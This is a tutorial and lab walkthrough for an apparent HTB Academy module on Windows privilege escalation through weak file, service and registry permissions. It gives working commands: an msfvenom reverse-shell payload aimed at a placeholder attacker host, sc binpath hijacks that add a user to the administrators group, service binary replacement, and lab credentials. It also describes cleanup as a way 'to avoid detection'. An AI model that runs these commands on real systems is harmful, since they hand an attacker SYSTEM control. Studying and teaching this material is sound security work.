# Weak Permissions Privilege Escalation

## 🎯 Overview

**Weak permissions** are common in third-party software and custom applications. Services typically run with **SYSTEM privileges**, making permission flaws a direct path to **complete system control**. Key vectors include **file system ACLs**, **service permissions**, **unquoted paths**, **registry ACLs**, and **autorun binaries**.

## 🔧 Permissive File System ACLs

### Service Binary Discovery
```powershell
# Use SharpUp to identify vulnerable service binaries
.\SharpUp.exe audit

# Example output:
Name             : SecurityService
DisplayName      : PC Security Management Service
PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
State            : Stopped
StartMode        : Auto
```

### Permission Verification
```cmd
# Check file permissions with icacls
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

# Vulnerable example:
C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
# (F) = Full Control for Users and Everyone
```

### Binary Replacement Attack
```cmd
# Backup original binary
copy "C:\Program Files (x86)\PCProtect\SecurityService.exe" SecurityService.exe.bak

# Generate malicious binary
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACK_IP LPORT=4444 -f exe > malicious.exe

# Replace service binary
copy /Y malicious.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"

# Start service for SYSTEM shell
sc start SecurityService
```

## 🛠️ Weak Service Permissions

### Service Permission Enumeration
```cmd
# Check service permissions with AccessChk
accesschk.exe /accepteula -quvcw WindscribeService

# Vulnerable output:
WindscribeService
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS    # ← Full control for all users
```

### Binary Path Modification Attack
```cmd
# Check current local admin group
net localgroup administrators

# Modify service binary path
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

# Stop and start service to execute command
sc stop WindscribeService
sc start WindscribeService

# Verify privilege escalation
net localgroup administrators
# htb-student should now be listed
```

### Service Cleanup
```cmd
# Restore original binary path
sc config WindscribeService binpath="C:\Program Files (x86)\Windscribe\WindscribeService.exe"

# Start service normally
sc start WindscribeService
```

## 📁 Unquoted Service Path

### Path Discovery
```cmd
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Example vulnerable path:
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

### Execution Order Analysis
```cmd
# Windows searches for executables in this order:
C:\Program.exe
C:\Program Files (x86)\System.exe
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe

# Limitation: Requires admin privileges to write to root or Program Files
```

## 🔑 Permissive Registry ACLs

### Registry Service Key Enumeration
```cmd
# Check for weak registry ACLs
accesschk.exe /accepteula "htb-student" -kvuqsw hklm\System\CurrentControlSet\services

# Vulnerable example:
RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS
```

### Registry Modification Attack
```powershell
# Modify service ImagePath in registry
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\htb-student\malicious.exe"

# Restart service or system for execution
```

## 🚀 Modifiable Registry Autorun Binary

### Autorun Program Discovery
```powershell
# Check startup programs
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl

# Example autorun locations:
- HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run (System-wide)
- HKU\S-1-5-21-...\SOFTWARE\Microsoft\Windows\CurrentVersion\Run (User-specific)
```

### Autorun Exploitation
```cmd
# Check permissions on autorun binary
icacls "C:\Program Files (x86)\Windscribe\Windscribe.exe"

# If writable, replace with malicious binary
# Executes when target user logs in
```

## 🎯 HTB Academy Lab Solution

### Lab Environment
- **Credentials**: `htb-student:HTB_@cademy_stdnt!`
- **Access Method**: RDP
- **Objective**: Escalate privileges using weak permissions
- **Flag Location**: `C:\Users\Administrator\Desktop\WeakPerms\flag.txt`

### Complete Walkthrough
```cmd
# 1. RDP connect and enumerate services
.\SharpUp.exe audit

# 2. Check for weak service permissions
accesschk.exe /accepteula -quvcw [SERVICE_NAME]

# 3. Identify exploitable service (e.g., WindscribeService)
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

# 4. Execute privilege escalation
sc stop WindscribeService
sc start WindscribeService

# 5. Verify admin access
net localgroup administrators

# 6. Access flag as administrator
type C:\Users\Administrator\Desktop\WeakPerms\flag.txt

# 7. Clean up (optional)
sc config WindscribeService binpath="[ORIGINAL_PATH]"
net localgroup administrators htb-student /delete
```

## 🔄 Alternative Techniques

### PowerShell Service Enumeration
```powershell
# Get services with weak permissions
Get-WmiObject win32_service | Select-Object Name, DisplayName, PathName, StartMode | Where-Object {$_.StartMode -eq "Auto"}
```

### Manual Permission Checks
```cmd
# Check file permissions
icacls "C:\Program Files\Application\service.exe"

# Check service permissions
sc sdshow [SERVICE_NAME]

# Check registry permissions
reg query HKLM\System\CurrentControlSet\Services\[SERVICE] /s
```

## ⚠️ Detection & Defense

### Detection Indicators
```cmd
# Monitor for:
- Service configuration changes (Event ID 7040)
- Unusual binary modifications in Program Files
- Registry modifications in service keys
- Privilege escalation events
```

### Defensive Measures
```cmd
# Security hardening:
- Implement least privilege for service accounts
- Regular permission audits on critical binaries
- Monitor service configuration changes
- Restrict write access to system directories
- Use Application Control policies
```

## 💡 Key Takeaways

1. **Third-party software** commonly has weak permissions
2. **Service binaries** are high-value targets (SYSTEM privileges)
3. **Multiple attack vectors** - files, services, registry, autorun
4. **AccessChk and SharpUp** are essential enumeration tools
5. **Cleanup important** to avoid detection and maintain operations

---

*Weak permissions exploitation leverages misconfigurations in file systems, services, and registry to achieve privilege escalation.* 